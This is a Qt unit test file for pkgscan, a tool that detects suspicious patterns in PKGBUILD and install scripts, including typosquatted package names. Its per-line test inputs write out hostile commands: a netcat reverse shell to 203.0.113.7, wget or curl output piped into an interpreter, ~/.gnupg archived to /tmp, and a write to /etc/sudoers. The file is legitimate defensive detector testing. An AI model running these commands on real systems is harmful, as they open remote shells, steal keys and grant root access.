// SPDX-License-Identifier: GPL-3.0-or-later
#include "pkgscan.hpp"

#include <QFile>
#include <QTest>

using pkgscan::Severity;

namespace {

QString readData(const char* name) {
    QFile file(QStringLiteral(TEST_DATA_DIR "/") + QLatin1String(name));
    if (!file.open(QIODevice::ReadOnly)) {
        qFatal("missing test data %s", name);
    }
    return QString::fromUtf8(file.readAll());
}

QStringList ids(const QList<pkgscan::Finding>& findings) {
    QStringList out;
    for (const auto& finding : findings) {
        out << finding.id;
    }
    return out;
}

int lineOf(const QList<pkgscan::Finding>& findings, const char* id) {
    for (const auto& finding : findings) {
        if (finding.id == QLatin1String(id)) {
            return finding.line;
        }
    }
    return -1;
}

QString wrap(const QString& body) {
    return QStringLiteral("pkgname=x\npkgver=1\nsource=()\nbuild() {\n%1\n}\n").arg(body);
}

}  // namespace

class TestPkgscan : public QObject {
    Q_OBJECT

 private slots:
    void cleanPackageHasNoWarnings() {
        const auto analysis = pkgscan::scanPkgbuild(readData("clean.PKGBUILD"));
        for (const auto& finding : analysis.findings) {
            QVERIFY2(finding.severity == Severity::Info, qPrintable(finding.id + u':' + QString::number(finding.line) + u' ' + finding.excerpt));
        }
        QCOMPARE(analysis.hosts, QStringList{QStringLiteral("github.com")});
        // the install scriptlet comes first, the patch is not a script
        QCOMPARE(analysis.localFiles, (QStringList{QStringLiteral("hello-tool.install"), QStringLiteral("hello-tool.service")}));
    }

    void maliciousPackage() {
        const auto analysis = pkgscan::scanPkgbuild(readData("malicious.PKGBUILD"));
        const auto found    = ids(analysis.findings);
        for (const char* id : {"top-level-command", "download", "no-checksum", "ip-host", "throwaway-host", "weak-checksum", "vcs-unpinned",
                 "pipe-to-shell", "tls-off", "decode-exec", "eval", "obfuscated-escapes", "credentials", "reverse-shell", "inline-script",
                 "privilege", "system-write", "root-access", "service", "setuid", "autostart", "destructive", "home"}) {
            QVERIFY2(found.contains(QLatin1String(id)), id);
        }
        QCOMPARE(analysis.findings.first().severity, Severity::Danger);
        QCOMPARE(lineOf(analysis.findings, "pipe-to-shell"), 16);
        QCOMPARE(lineOf(analysis.findings, "ip-host"), 8);
        QCOMPARE(lineOf(analysis.findings, "reverse-shell"), 24);
        // a pipe to a shell is reported once, not also as a plain download
        QCOMPARE(found.count(QStringLiteral("download")), 2);
        QVERIFY(analysis.hosts.contains(QStringLiteral("203.0.113.7")));
    }

    void installScript() {
        const auto findings = pkgscan::scanScript(readData("bad.install"), QStringLiteral("bad.install"));
        const auto found    = ids(findings);
        QCOMPARE(found.count(QStringLiteral("pipe-to-shell")), 1);  // the commented one is ignored
        QCOMPARE(lineOf(findings, "pipe-to-shell"), 3);
        QVERIFY(found.contains(QStringLiteral("service")));
        QVERIFY(found.contains(QStringLiteral("autostart")));
        QVERIFY(found.contains(QStringLiteral("credentials")));
        QVERIFY(found.contains(QStringLiteral("home")));
        QCOMPARE(findings.first().file, QStringLiteral("bad.install"));
    }

    void lineRules_data() {
        QTest::addColumn<QString>("line");
        QTest::addColumn<QString>("expected");  // empty: nothing above Info

        QTest::newRow("configure flag") << "./configure --prefix=/usr --with-curl --enable-wget" << "";
        QTest::newRow("make install") << "make DESTDIR=\"$pkgdir\" install" << "";
        QTest::newRow("license from system") << "install -Dm644 /usr/share/licenses/common/GPL3/license.txt \"$pkgdir/usr/share/licenses/x/LICENSE\"" << "";
        QTest::newRow("sed prefix") << "sed -i 's|/usr/local|/usr|g' Makefile" << "";
        QTest::newRow("cargo") << "cargo build --release --locked" << "";
        QTest::newRow("mode 755") << "chmod 0755 \"$pkgdir/usr/bin/x\"" << "";
        QTest::newRow("comment") << "# curl https://example.org | sh" << "";
        QTest::newRow("evaluate word") << "echo \"evaluating curl output\"" << "";
        QTest::newRow("home redirected") << "HOME=\"$srcdir\" npm install --cache \"$srcdir/npm\"" << "";
        QTest::newRow("curl in pipe") << "cd src && curl -LO https://example.org/a.zip" << "download";
        QTest::newRow("wget to python") << "wget -qO- https://example.org/a.py | python3" << "pipe-to-shell";
        QTest::newRow("process substitution") << "bash <(curl -s https://example.org/a.sh)" << "pipe-to-shell";
        QTest::newRow("git clone") << "git clone https://example.org/a.git" << "download";
        QTest::newRow("write to etc") << "cp config /etc/app.conf" << "system-write";
        QTest::newRow("redirect to usr") << "echo x > /usr/share/x/y" << "system-write";
        QTest::newRow("setuid symbolic") << "chmod u+s \"$pkgdir/usr/bin/x\"" << "setuid";
        QTest::newRow("netcat") << "nc 203.0.113.7 4444 -e /bin/sh" << "reverse-shell";
        QTest::newRow("gnupg") << "tar czf /tmp/k.tgz ~/.gnupg" << "credentials";
        QTest::newRow("sudoers") << "echo x >> /etc/sudoers" << "root-access";
        QTest::newRow("home") << "cp x \"$HOME/.local/bin/x\"" << "home";
        QTest::newRow("base64 blob") << QStringLiteral("echo %1 > x").arg(QStringLiteral("QmFzZTY0IGJsb2Igd2l0aCBtaXhlZCBjYXNl").repeated(6)) << "encoded-blob";
        QTest::newRow("sha512 is not a blob") << QStringLiteral("echo %1").arg(QStringLiteral("0123456789abcdef").repeated(12)) << "";
    }

    void lineRules() {
        QFETCH(QString, line);
        QFETCH(QString, expected);
        QStringList serious;
        for (const auto& finding : pkgscan::scanPkgbuild(wrap(line)).findings) {
            if (finding.severity != Severity::Info) {
                serious << finding.id;
            }
        }
        if (expected.isEmpty()) {
            QVERIFY2(serious.isEmpty(), qPrintable(serious.join(u',')));
        } else {
            QVERIFY2(serious.contains(expected), qPrintable(serious.join(u',')));
        }
    }

    void metadata() {
        const auto now = QDateTime::fromSecsSinceEpoch(2'000'000'000);
        pkgscan::Metadata meta{QStringLiteral("x"), QStringLiteral("alice"), QStringLiteral("alice"), 120, 2.0, 1'900'000'000, 1'990'000'000};
        QVERIFY(pkgscan::scanMetadata(meta, now).isEmpty());

        meta.maintainer.clear();
        QVERIFY(ids(pkgscan::scanMetadata(meta, now)).contains(QStringLiteral("orphaned")));

        meta.maintainer     = QStringLiteral("mallory");
        meta.lastModified   = 2'000'000'000 - 3600;
        meta.votes          = 0;
        meta.popularity     = 0;
        auto found          = ids(pkgscan::scanMetadata(meta, now));
        QCOMPARE(found, (QStringList{QStringLiteral("adopted"), QStringLiteral("recent-change"), QStringLiteral("few-users")}));

        meta.firstSubmitted = 2'000'000'000 - 5 * 86400;
        found               = ids(pkgscan::scanMetadata(meta, now));
        QVERIFY(found.contains(QStringLiteral("new-package")));
        QVERIFY(!found.contains(QStringLiteral("recent-change")));
    }

    void similarNames() {
        const QStringList known{QStringLiteral("firefox"), QStringLiteral("discord"), QStringLiteral("gtk3"), QStringLiteral("python-requests"), QStringLiteral("vlc")};
        QCOMPARE(pkgscan::similarName(QStringLiteral("firefoxx-bin"), known), QStringLiteral("firefox"));
        QCOMPARE(pkgscan::similarName(QStringLiteral("dicsord"), known), QStringLiteral("discord"));
        QCOMPARE(pkgscan::similarName(QStringLiteral("python-request"), known), QStringLiteral("python-requests"));
        QCOMPARE(pkgscan::similarName(QStringLiteral("firefox-bin"), known), QString());  // a variant of the real package
        QCOMPARE(pkgscan::similarName(QStringLiteral("firefox"), known), QString());
        QCOMPARE(pkgscan::similarName(QStringLiteral("gtk4x"), known), QString());
        QCOMPARE(pkgscan::similarName(QStringLiteral("vlcc"), known), QString());  // too short to judge
        QCOMPARE(pkgscan::similarName(QStringLiteral("spotify"), known), QString());
    }
};

QTEST_APPLESS_MAIN(TestPkgscan)
#include "test_pkgscan.moc"
